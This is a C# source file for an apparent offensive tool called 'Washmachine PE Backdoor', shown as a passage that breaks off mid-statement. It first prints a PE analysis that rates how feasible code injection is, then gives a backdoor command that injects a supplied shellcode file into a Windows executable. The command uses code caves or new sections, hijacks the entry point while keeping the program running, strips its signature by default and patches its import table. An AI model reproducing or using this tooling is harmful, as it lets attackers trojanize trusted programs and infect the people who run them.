                    AnsiConsole.MarkupLine($"  [cyan1]DLL Chars:[/] [grey63]{Markup.Escape(string.Join(", ", oh.DllCharacteristicsList))}[/]");
            }

            if (result.FileHeader != null)
            {
                AnsiConsole.MarkupLine(
                    $"  [cyan1]Machine:[/] [white]{Markup.Escape(result.FileHeader.MachineString)}[/]    " +
                    $"[cyan1]Timestamp:[/] [white]{result.FileHeader.TimeDateStampUtc:yyyy-MM-dd HH:mm:ss} UTC[/]");

                if (result.FileHeader.CharacteristicsList.Count > 0)
                    AnsiConsole.MarkupLine($"  [cyan1]Characteristics:[/] [grey63]{Markup.Escape(string.Join(", ", result.FileHeader.CharacteristicsList))}[/]");
            }

            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  SECTIONS TABLE
            // ══════════════════════════════════════════════════════════
            AnsiConsole.Write(new Rule("[bold dodgerblue2]Sections[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
            AnsiConsole.WriteLine();

            var sectionTable = new Table()
                .Border(TableBorder.Simple)
                .BorderColor(Color.Grey42)
                .AddColumn(new TableColumn("[cyan1]Section[/]").LeftAligned())
                .AddColumn(new TableColumn("[cyan1]VirtAddr[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan1]VirtSize[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan1]RawAddr[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan1]RawSize[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan1]Perms[/]").Centered())
                .AddColumn(new TableColumn("[cyan1]Entropy[/]").RightAligned())
                .AddColumn(new TableColumn("[cyan1]Bar[/]").LeftAligned());

            foreach (var sec in result.Sections)
            {
                string entropyColor = sec.Entropy < 6.0 ? "green3_1" : sec.Entropy < 7.0 ? "gold1" : "red1";
                string nameColor = sec.IsExecutable ? "red1" : "white";
                string entropyBar = BuildEntropyBar(sec.Entropy);

                sectionTable.AddRow(
                    $"[{nameColor}]{Markup.Escape(sec.Name)}[/]",
                    $"[mediumpurple1]0x{sec.VirtualAddress:X8}[/]",
                    $"[mediumpurple1]0x{sec.VirtualSize:X8}[/]",
                    $"[mediumpurple1]0x{sec.RawAddress:X8}[/]",
                    $"[mediumpurple1]0x{sec.RawSize:X8}[/]",
                    Markup.Escape(sec.PermissionsString),
                    $"[{entropyColor}]{sec.Entropy:F2}[/]",
                    entropyBar
                );
            }

            AnsiConsole.Write(sectionTable);
            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  SECURITY ASSESSMENT (detailed)
            // ══════════════════════════════════════════════════════════
            if (result.Security != null)
            {
                var secDetail = result.Security;
                AnsiConsole.Write(new Rule("[bold dodgerblue2]Security Assessment[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.WriteLine();

                var protTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(Color.Grey42)
                    .AddColumn(new TableColumn("[cyan1]Protection[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Status[/]").Centered())
                    .AddColumn(new TableColumn("[cyan1]Protection[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Status[/]").Centered());

                var allFlags = new List<(string name, bool enabled)>
                {
                    ("ASLR", secDetail.HasAslr),
                    ("DEP / NX", secDetail.HasDep),
                    ("CFG (Control Flow Guard)", secDetail.HasCfg),
                    ("High Entropy VA", secDetail.HasHighEntropyVa),
                    ("SEH", secDetail.HasSeh),
                    ("SafeSEH", secDetail.HasSafeSeh),
                    ("RFG", secDetail.HasRfg),
                    ("Force Integrity", secDetail.ForceIntegrity),
                    ("NX Compat", secDetail.NxCompat),
                    ("Authenticode", secDetail.HasAuthenticode),
                    ("AppContainer", secDetail.AppContainer),
                    ("Terminal Server Aware", secDetail.TerminalServerAware),
                };

                for (int fi = 0; fi < allFlags.Count; fi += 2)
                {
                    var left = allFlags[fi];
                    string leftIcon = left.enabled ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";

                    if (fi + 1 < allFlags.Count)
                    {
                        var right = allFlags[fi + 1];
                        string rightIcon = right.enabled ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";
                        protTable.AddRow(
                            $"[white]{Markup.Escape(left.name)}[/]", leftIcon,
                            $"[white]{Markup.Escape(right.name)}[/]", rightIcon);
                    }
                    else
                    {
                        protTable.AddRow(
                            $"[white]{Markup.Escape(left.name)}[/]", leftIcon,
                            "", "");
                    }
                }

                AnsiConsole.Write(protTable);
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  IMPORTS
            // ══════════════════════════════════════════════════════════
            if (result.Imports.Count > 0)
            {
                int totalFuncs = result.TotalImports;
                AnsiConsole.Write(new Rule($"[bold dodgerblue2]Imports ({result.Imports.Count} DLLs, {totalFuncs} functions)[/]")
                    .RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.WriteLine();

                var importTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(Color.Grey42)
                    .AddColumn(new TableColumn("[cyan1]DLL[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Functions[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan1]Delay[/]").Centered())
                    .AddColumn(new TableColumn("[cyan1]DLL[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Functions[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan1]Delay[/]").Centered());

                var importList = result.Imports.Take(20).ToList();
                for (int ii = 0; ii < importList.Count; ii += 2)
                {
                    var left = importList[ii];
                    string leftDelay = left.IsDelayLoaded ? "[gold1]Yes[/]" : "[grey63]No[/]";

                    if (ii + 1 < importList.Count)
                    {
                        var right = importList[ii + 1];
                        string rightDelay = right.IsDelayLoaded ? "[gold1]Yes[/]" : "[grey63]No[/]";
                        importTable.AddRow(
                            $"[white]{Markup.Escape(left.Name)}[/]", $"[white]{left.Functions.Count}[/]", leftDelay,
                            $"[white]{Markup.Escape(right.Name)}[/]", $"[white]{right.Functions.Count}[/]", rightDelay);
                    }
                    else
                    {
                        importTable.AddRow(
                            $"[white]{Markup.Escape(left.Name)}[/]", $"[white]{left.Functions.Count}[/]", leftDelay,
                            "", "", "");
                    }
                }

                AnsiConsole.Write(importTable);

                if (result.Imports.Count > 20)
                    AnsiConsole.MarkupLine($"  [grey63]... and {result.Imports.Count - 20} more DLLs[/]");

                // Suspicious imports
                var suspicious = result.Imports
                    .SelectMany(d => d.Functions.Where(f => f.IsSuspicious)
                        .Select(f => new { Dll = d.Name, f.Name, f.SuspiciousReason }))
                    .ToList();

                if (suspicious.Count > 0)
                {
                    AnsiConsole.WriteLine();
                    AnsiConsole.MarkupLine($"  [red1]\u26a0 Suspicious Imports ({suspicious.Count}):[/]");

                    var suspTable = new Table()
                        .Border(TableBorder.Simple)
                        .BorderColor(Color.Red)
                        .AddColumn(new TableColumn("[red1]DLL[/]").LeftAligned())
                        .AddColumn(new TableColumn("[red1]Function[/]").LeftAligned())
                        .AddColumn(new TableColumn("[red1]Reason[/]").LeftAligned());

                    foreach (var s in suspicious)
                    {
                        suspTable.AddRow(
                            $"[gold1]{Markup.Escape(s.Dll)}[/]",
                            $"[red1]{Markup.Escape(s.Name)}[/]",
                            $"[grey63]{Markup.Escape(s.SuspiciousReason)}[/]"
                        );
                    }

                    AnsiConsole.Write(suspTable);
                }

                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  EXPORTS
            // ══════════════════════════════════════════════════════════
            if (result.TotalExports > 0)
            {
                AnsiConsole.Write(new Rule($"[bold dodgerblue2]Exports ({result.TotalExports})[/]")
                    .RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.WriteLine();

                var exportTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(Color.Grey42)
                    .AddColumn(new TableColumn("[cyan1]Name[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Ordinal[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan1]RVA[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan1]Forwarded[/]").LeftAligned());

                foreach (var exp in result.Exports)
                {
                    exportTable.AddRow(
                        $"[white]{Markup.Escape(exp.Name)}[/]",
                        $"[white]{exp.Ordinal}[/]",
                        $"[mediumpurple1]0x{exp.Rva:X8}[/]",
                        exp.IsForwarded
                            ? $"[gold1]{Markup.Escape(exp.ForwardedTo)}[/]"
                            : "[grey63]No[/]"
                    );
                }

                AnsiConsole.Write(exportTable);
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  RESOURCES
            // ══════════════════════════════════════════════════════════
            if (result.Resources?.Count > 0)
            {
                AnsiConsole.Write(new Rule($"[bold dodgerblue2]Resources ({result.Resources.Count})[/]")
                    .RuleStyle(Style.Parse("grey42")).LeftJustified());

                var resFlags = new List<string>();
                if (result.HasManifest) resFlags.Add("[green3_1]\u2713 Manifest[/]");
                if (result.HasIcon) resFlags.Add("[green3_1]\u2713 Icon[/]");
                if (result.HasVersionInfo) resFlags.Add("[green3_1]\u2713 VersionInfo[/]");
                if (resFlags.Count > 0)
                    AnsiConsole.MarkupLine($"  {string.Join("  ", resFlags)}");
                AnsiConsole.WriteLine();

                var resTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(Color.Grey42)
                    .AddColumn(new TableColumn("[cyan1]Type[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Name[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]Size[/]").RightAligned());

                foreach (var res in result.Resources)
                {
                    resTable.AddRow(
                        $"[white]{Markup.Escape(res.Type)}[/]",
                        $"[white]{Markup.Escape(res.Name)}[/]",
                        $"[white]{res.Size:N0}[/]"
                    );
                }

                AnsiConsole.Write(resTable);
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  TLS
            // ══════════════════════════════════════════════════════════
            if (result.Tls != null)
            {
                AnsiConsole.Write(new Rule("[bold dodgerblue2]TLS (Thread Local Storage)[/]")
                    .RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.WriteLine();

                AnsiConsole.MarkupLine($"  [cyan1]Callbacks:[/] [white]{result.Tls.NumberOfCallbacks}[/]");

                if (result.Tls.CallbackAddresses.Count > 0)
                {
                    foreach (var addr in result.Tls.CallbackAddresses)
                        AnsiConsole.MarkupLine($"    [mediumpurple1]0x{addr:X}[/]");
                }

                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  CODE CAVES
            // ══════════════════════════════════════════════════════════
            AnsiConsole.Write(new Rule($"[bold dodgerblue2]Code Caves ({result.TotalCodeCaves} found, {result.TotalCodeCaveSpace:N0} bytes total)[/]")
                .RuleStyle(Style.Parse("grey42")).LeftJustified());
            AnsiConsole.WriteLine();

            if (result.TotalCodeCaves > 0)
            {
                AnsiConsole.MarkupLine($"  [cyan1]Largest:[/] [white]{result.LargestCodeCave:N0} bytes[/]");
                AnsiConsole.WriteLine();

                var caveTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(Color.Grey42)
                    .AddColumn("[cyan1]Section[/]")
                    .AddColumn("[cyan1]Offset[/]")
                    .AddColumn("[cyan1]RVA[/]")
                    .AddColumn("[cyan1]Size[/]")
                    .AddColumn("[cyan1]Injectable[/]");

                foreach (var cave in result.CodeCaves.Take(10))
                {
                    var injectIcon = cave.SuitableForInjection ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";
                    caveTable.AddRow(
                        Markup.Escape(cave.SectionName),
                        $"[mediumpurple1]0x{cave.FileOffset:X8}[/]",
                        $"[mediumpurple1]0x{cave.VirtualAddress:X8}[/]",
                        $"[white]{cave.Size:N0} B[/]",
                        injectIcon
                    );
                }

                AnsiConsole.Write(caveTable);

                if (result.TotalCodeCaves > 10)
                    AnsiConsole.MarkupLine($"  [grey63]... and {result.TotalCodeCaves - 10} more caves[/]");
            }
            else
            {
                AnsiConsole.MarkupLine("  [grey63]No code caves found[/]");
            }

            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  PACKING / ENTROPY
            // ══════════════════════════════════════════════════════════
            AnsiConsole.Write(new Rule("[bold dodgerblue2]Packing / Entropy[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
            AnsiConsole.WriteLine();

            string overallEntropyColor = result.OverallEntropy < 6.0 ? "green3_1" : result.OverallEntropy < 7.0 ? "gold1" : "red1";
            AnsiConsole.MarkupLine($"  [cyan1]Overall Entropy:[/]  [{overallEntropyColor}]{result.OverallEntropy:F4}[/]  {BuildEntropyBar(result.OverallEntropy, 15)}");
            AnsiConsole.MarkupLine($"  [cyan1]Possibly Packed:[/]  {(result.IsPossiblyPacked ? "[red1]Yes[/]" : "[green3_1]No[/]")}");

            if (!string.IsNullOrEmpty(result.PackerDetection))
                AnsiConsole.MarkupLine($"  [cyan1]Packer Detected:[/]  [gold1]{Markup.Escape(result.PackerDetection)}[/]");

            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  INJECTION FEASIBILITY
            // ══════════════════════════════════════════════════════════
            if (result.Feasibility != null)
            {
                var feas = result.Feasibility;
                AnsiConsole.Write(new Rule("[bold dodgerblue2]Injection Feasibility[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.WriteLine();

                var feasLines = new List<string>();

                void AddFeasMethod(string icon, string name, MethodFeasibility m)
                {
                    string statusColor = m.Status switch
                    {
                        "Available" => "green3_1",
                        "Limited" => "gold1",
                        _ => "red1"
                    };
                    string space = m.AvailableSpace > 0 ? $"  [white]{m.AvailableSpace:N0} B[/]" : "";
                    feasLines.Add($"  {icon} [white]{name.PadRight(18)}[/] [{statusColor}]{Markup.Escape(m.Status).PadRight(12)}[/]{space}");
                }

                AddFeasMethod(feas.CodeCave.IsFeasible ? "[green3_1]\u2605[/]" : "[grey63]\u25cb[/]", "Code Cave", feas.CodeCave);
                AddFeasMethod(feas.NewSection.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "New Section", feas.NewSection);
                AddFeasMethod(feas.SectionExtension.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "Section Extension", feas.SectionExtension);
                AddFeasMethod(feas.TlsCallback.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "TLS Callback", feas.TlsCallback);
                AddFeasMethod(feas.EntryPointHijack.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "EP Hijack", feas.EntryPointHijack);

                if (!string.IsNullOrEmpty(feas.RecommendedMethod))
                {
                    feasLines.Add("");
                    feasLines.Add($"  [cyan1]Recommended:[/] [green3_1]{Markup.Escape(feas.RecommendedMethod)}[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", feasLines)))
                    .Border(BoxBorder.Rounded)
                    .BorderColor(Color.Cyan1));
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  SECTION MEMORY MAP
            // ══════════════════════════════════════════════════════════
            if (result.Sections.Count > 0)
            {
                AnsiConsole.Write(new Rule("[bold dodgerblue2]Section Memory Map[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.WriteLine();

                long totalVirt = result.Sections.Sum(s => (long)s.VirtualSize);
                int mapBarWidth = 40;

                foreach (var s in result.Sections)
                {
                    double pct = totalVirt > 0 ? (double)s.VirtualSize / totalVirt * 100.0 : 0;
                    int filled = (int)Math.Round(pct / 100.0 * mapBarWidth);
                    filled = Math.Clamp(filled, 1, mapBarWidth);
                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : "cyan1";
                    string bar = $"[{barColor}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', mapBarWidth - filled)}[/]";

                    string sizeStr = s.VirtualSize >= 1048576
                        ? $"{s.VirtualSize / 1048576.0:F1} MB"
                        : s.VirtualSize >= 1024
                        ? $"{s.VirtualSize / 1024.0:F0} KB"
                        : $"{s.VirtualSize} B";

                    AnsiConsole.MarkupLine(
                        $"  [white]{Markup.Escape(s.Name).PadRight(8)}[/]  {bar}  [white]{sizeStr,8}[/]  [grey63]{Markup.Escape(s.PermissionsString)}[/]  [grey63]{pct:F1}%[/]");
                }

                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  VIRTUAL ADDRESS SPACE
            // ══════════════════════════════════════════════════════════
            if (result.Sections.Count > 0 && result.OptionalHeader != null)
            {
                AnsiConsole.Write(new Rule("[bold dodgerblue2]Virtual Address Space[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.WriteLine();

                long totalImage = result.OptionalHeader.SizeOfImage;
                int vaBarWidth = 30;

                // PE Headers
                if (result.Sections.Count > 0)
                {
                    uint headerEnd = result.Sections[0].VirtualAddress;
                    AnsiConsole.MarkupLine($"  [mediumpurple1]0x{0:X8}[/] [grey63]\u252c\u2500\u2500[/] [dodgerblue2]PE Headers[/] [grey63]({headerEnd:N0} B)[/]");
                }

                for (int si = 0; si < result.Sections.Count; si++)
                {
                    var s = result.Sections[si];
                    double pct = totalImage > 0 ? (double)s.VirtualSize / totalImage * 100.0 : 0;
                    int filled = (int)Math.Round(pct / 100.0 * vaBarWidth);
                    filled = Math.Clamp(filled, 1, vaBarWidth);
                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : "cyan1";
                    string bar = $"[{barColor}]{new string('\u2588', filled)}[/]";
                    string connector = si < result.Sections.Count - 1 ? "\u251c\u2500\u2500" : "\u2514\u2500\u2500";

                    string sizeStr = s.VirtualSize >= 1048576
                        ? $"{s.VirtualSize / 1048576.0:F1} MB"
                        : s.VirtualSize >= 1024
                        ? $"{s.VirtualSize / 1024.0:F0} KB"
                        : $"{s.VirtualSize} B";

                    AnsiConsole.MarkupLine(
                        $"  [mediumpurple1]0x{s.VirtualAddress:X8}[/] [grey63]{connector}[/] {bar} [white]{Markup.Escape(s.Name)}[/] [grey63]{Markup.Escape(s.PermissionsString)}  {sizeStr}[/]");
                }

                AnsiConsole.WriteLine();
            }


            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Analysis failed: {ex.Message}");
            return 1;
        }
    }

    /// <summary>Build a Spectre markup usage bar.</summary>
    private static string BuildUsageBar(double pct, int width = 20)
    {
        int filled = (int)Math.Round(pct / 100.0 * width);
        filled = Math.Clamp(filled, 0, width);
        return $"[cyan1]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', width - filled)}[/]";
    }

    /// <summary>Build a colored entropy bar (green &lt; 6, gold &lt; 7, red &gt;= 7).</summary>
    private static string BuildEntropyBar(double entropy, int width = 20)
    {
        double pct = entropy / 8.0 * 100.0;
        int filled = (int)Math.Round(pct / 100.0 * width);
        filled = Math.Clamp(filled, 0, width);
        string color = entropy < 6.0 ? "green3_1" : entropy < 7.0 ? "gold1" : "red1";
        return $"[{color}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', width - filled)}[/]";
    }


    // ═══════════════════════════════════════════════════════════════════════
    //  backdoor
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunBackdoorAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("backdoor", RunBackdoorAsync, PrintBackdoorUsage);

        string? peFile = null;
        string? shellcodeFile = null;
        string? outputFile = null;
        string method = "code-cave";
        string encryption = "none";
        string carrier = "entry-point";
        byte xorKey = 0x42;
        string sectionName = ".extra";
        bool removeSig = true;
        bool patchSubsystem = true;
        bool preserveEntry = true;
        bool patchIat = true;
        bool patchExitCalls = true;
        bool dryRun = false;
        bool verbose = false;
        bool jsonOutput = false;
        int minCaveSize = 0;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--pe" when i + 1 < args.Length:
                    peFile = args[++i]; break;
                case "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFile = args[++i]; break;
                case "--output" or "-o" when i + 1 < args.Length:
                    outputFile = args[++i]; break;
                case "--method" or "-m" when i + 1 < args.Length:
                    method = args[++i].ToLowerInvariant(); break;
                case "--encryption" or "--enc" when i + 1 < args.Length:
                    encryption = args[++i].ToLowerInvariant(); break;
                case "--xor-key" when i + 1 < args.Length:
                    var keyStr = args[++i];
                    xorKey = keyStr.StartsWith("0x", StringComparison.OrdinalIgnoreCase)
                        ? Convert.ToByte(keyStr, 16)
                        : byte.Parse(keyStr);
                    break;
                case "--section-name" when i + 1 < args.Length:
                    sectionName = args[++i]; break;
                case "--no-remove-sig":
                    removeSig = false; break;
                case "--no-patch-subsystem":
                    patchSubsystem = false; break;
                case "--carrier" or "--invoke" when i + 1 < args.Length:
                    carrier = args[++i].ToLowerInvariant(); break;
                case "--no-preserve-entry":
                    preserveEntry = false; break;
                case "--no-patch-iat":
                    patchIat = false; break;
                case "--no-patch-exit":
                    patchExitCalls = false; break;
                case "--cave-min-size" when i + 1 < args.Length:
                    minCaveSize = int.Parse(args[++i]); break;
                case "--dry-run":
                    dryRun = true; break;
                case "--verbose":
                    verbose = true; break;
                case "--json":
                    jsonOutput = true; break;
                default:
                    if (args[i].StartsWith("-"))
                    {
                        AnsiConsole.MarkupLine($"[red]Error:[/] Unknown option: {Markup.Escape(args[i])}");
                        PrintBackdoorUsage();
                        return 1;
                    }
                    break;
            }
        }

        if (peFile == null || shellcodeFile == null)
        {
            PrintBackdoorUsage();
            return 1;
        }

        if (!File.Exists(peFile))
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] Target PE not found: {Markup.Escape(peFile)}");
            return 1;
        }
        if (!File.Exists(shellcodeFile))
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] Shellcode file not found: {Markup.Escape(shellcodeFile)}");
            return 1;
        }

        var injectionMethod = method switch
        {
            "code-cave" or "codecave" or "cave" => InjectionMethod.CodeCave,
            "new-section" or "newsection" or "section" => InjectionMethod.NewSection,
            "section-ext" or "sectionext" or "extend" => InjectionMethod.SectionExtension,
            _ => InjectionMethod.CodeCave
        };

        var encryptionMethod = encryption switch
        {
            "xor" => PayloadEncryption.Xor,
            "xor2" => PayloadEncryption.Xor2,
            "rc4" => PayloadEncryption.Rc4,
            _ => PayloadEncryption.None
        };

        var carrierInvoke = carrier switch
        {
            "entry-point" or "entrypoint" or "hijack" => CarrierInvoke.EntryPointHijack,
            "function-backdoor" or "function" => CarrierInvoke.EntryFunctionBackdoor,
            "tls" or "tls-callback" => CarrierInvoke.TlsCallback,
            _ => CarrierInvoke.EntryPointHijack
        };

        if (encryptionMethod != PayloadEncryption.None)
        {
            AnsiConsole.MarkupLine("[red]Error:[/] The backdoor command does not perform in-place encryption or encoding.");
            AnsiConsole.MarkupLine("[grey]Prepare a compatible flat .bin first, then inject it with [white]--encryption none[/].[/]");
            return 1;
        }

        if (carrierInvoke != CarrierInvoke.EntryPointHijack)
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] Carrier [white]{Markup.Escape(carrier)}[/] is not implemented for the backdoor command.");
            AnsiConsole.MarkupLine("[grey]Supported carrier: [white]entry-point[/].[/]");
            return 1;
        }

        if (!preserveEntry)
        {
            AnsiConsole.MarkupLine("[red]Error:[/] [white]--no-preserve-entry[/] is not implemented.");
            AnsiConsole.MarkupLine("[grey]The current carrier always resumes the original entry point after launching the payload.[/]");
            return 1;
        }

        var logger = new ConsoleLogger();
        if (verbose) logger.VerboseEnabled = true;
        if (jsonOutput) logger.SuppressOutput = true;
        var paths = new AppPaths();
        var service = new PeBackdoorService(paths, logger);
        var analyzerService = new PeAnalyzerService(logger);

        try
        {
            // ── Banner ───────────────────────────────────────────────
            if (!jsonOutput)
            {
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Panel("[bold cyan1]Washmachine PE Backdoor[/]")
                    .Border(BoxBorder.Double)
                    .BorderColor(Color.Cyan1));
                AnsiConsole.WriteLine();
            }

            // ── PE Analysis ──────────────────────────────────────────
            var peInfo = await service.AnalyzePeAsync(peFile);
            var analysisResult = await analyzerService.AnalyzeAsync(peFile);
            var shellcodeBytes = await File.ReadAllBytesAsync(shellcodeFile);

            if (!jsonOutput)
            {
                AnsiConsole.Write(new Rule("[bold cyan1]Target PE Analysis[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.WriteLine();

                var peTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey42)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                peTable.AddRow("[cyan1]File[/]", $"[white]{Markup.Escape(Path.GetFileName(peFile))}[/]");
                peTable.AddRow("[cyan1]Size[/]", $"[white]{new FileInfo(peFile).Length:N0} bytes ({new FileInfo(peFile).Length / 1024.0 / 1024.0:F1} MB)[/]");
                peTable.AddRow("[cyan1]Arch[/]", $"[white]{(peInfo.Is64Bit ? "x64 (PE32+)" : "x86 (PE32)")}[/]");
                peTable.AddRow("[cyan1]Type[/]", $"[white]{(peInfo.IsDll ? "DLL" : "GUI Executable")}[/]");
                peTable.AddRow("[cyan1]Entry[/]", $"[mediumpurple1]0x{peInfo.EntryPoint:X}[/]");
                peTable.AddRow("[cyan1]ImageBase[/]", $"[mediumpurple1]0x{peInfo.ImageBase:X}[/]");
                peTable.AddRow("[cyan1]Signature[/]", $"[white]{(peInfo.HasSignature ? "Present (will be removed)" : "None")}[/]");
                peTable.AddRow("[cyan1].NET[/]", $"[white]{(analysisResult.IsDotNet ? "Yes" : "No")}[/]");
                peTable.AddRow("[cyan1]ASLR[/]", $"[white]{(peInfo.HasAslr ? "Yes" : "No")}[/]");
                peTable.AddRow("[cyan1]Sections[/]", $"[white]{peInfo.Sections.Count}[/]");

                AnsiConsole.Write(peTable);
                AnsiConsole.WriteLine();

                var sectionTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey42)
                    .AddColumn(new TableColumn("[cyan1]Section[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan1]VirtAddr[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan1]VirtSize[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan1]RawSize[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan1]Perms[/]").Centered())
                    .AddColumn(new TableColumn("[cyan1]Entropy[/]").RightAligned());

                foreach (var sec in analysisResult.Sections)
                {
                    string entropyColor = sec.Entropy < 6.0 ? "green3_1" : sec.Entropy < 7.0 ? "yellow" : "red";
                    sectionTable.AddRow(
                        Markup.Escape(sec.Name),
                        $"[mediumpurple1]0x{sec.VirtualAddress:X6}[/]",
                        $"[mediumpurple1]0x{sec.VirtualSize:X6}[/]",
                        $"[mediumpurple1]0x{sec.RawSize:X6}[/]",
                        Markup.Escape(sec.PermissionsString),
                        $"[{entropyColor}]{sec.Entropy:F2}[/]"
                    );
                }

                AnsiConsole.Write(sectionTable);

                // Code caves
                AnsiConsole.WriteLine();
                var caves = await service.FindCodeCavesAsync(peFile, Math.Max(minCaveSize, 50));
                AnsiConsole.Write(new Rule("[bold cyan1]Code Caves[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
                AnsiConsole.MarkupLine($"  [cyan1]Found:[/] [white]{caves.Count}[/]");

                if (caves.Count > 0)
                {
                    var caveTable = new Table()
                        .Border(TableBorder.Rounded)
                        .BorderColor(Color.Grey42)
                        .AddColumn("[cyan1]Section[/]")
                        .AddColumn("[cyan1]Offset[/]")
                        .AddColumn("[cyan1]RVA[/]")
                        .AddColumn("[cyan1]Size[/]");

                    foreach (var cave in caves.Take(10))
                    {
                        caveTable.AddRow(
                            Markup.Escape(cave.SectionName),
                            $"[mediumpurple1]0x{cave.FileOffset:X6}[/]",
                            $"[mediumpurple1]0x{cave.VirtualAddress:X6}[/]",
                            $"[white]{cave.Size,6} bytes[/]"
                        );
                    }

                    AnsiConsole.Write(caveTable);

                    if (caves.Count > 10)
                        AnsiConsole.MarkupLine($"  [grey]... and {caves.Count - 10} more[/]");
                    AnsiConsole.MarkupLine($"  [cyan1]Largest:[/] [white]{Markup.Escape(caves[0].SectionName)} ({caves[0].Size:N0} bytes)[/]");
                }

                // Shellcode info
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule("[bold cyan1]Shellcode[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());

                var scTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey42)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                scTable.AddRow("[cyan1]File[/]", $"[white]{Markup.Escape(Path.GetFileName(shellcodeFile))}[/]");
                scTable.AddRow("[cyan1]Size[/]", $"[white]{shellcodeBytes.Length} bytes[/]");
                scTable.AddRow("[cyan1]First bytes[/]", $"[mediumpurple1]{BitConverter.ToString(shellcodeBytes.Take(Math.Min(16, shellcodeBytes.Length)).ToArray()).Replace("-", " ")}[/]");

                AnsiConsole.Write(scTable);

                // Pre-flight checks
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule("[bold cyan1]Pre-flight Checks[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
                PrintCheck(!analysisResult.IsDotNet, "Not a .NET assembly");
                PrintCheck(!analysisResult.IsPossiblyPacked, $"Not packed (entropy: {analysisResult.OverallEntropy:F2})");
                PrintCheck(peInfo.EntryPoint != 0, $"Entry point is valid (0x{peInfo.EntryPoint:X})");

                if (injectionMethod == InjectionMethod.CodeCave)
                {
                    int stubOverhead = peInfo.Is64Bit ? 66 : 14;
                    int needed = shellcodeBytes.Length + stubOverhead;
                    bool hasCave = caves.Any(c => c.Size >= needed);
                    PrintCheck(hasCave, $"Sufficient code cave space ({(hasCave ? $"{caves[0].Size:N0}" : "0")} >= {needed} bytes needed)");
                }

                PrintCheck(!peInfo.HasSignature || removeSig, peInfo.HasSignature
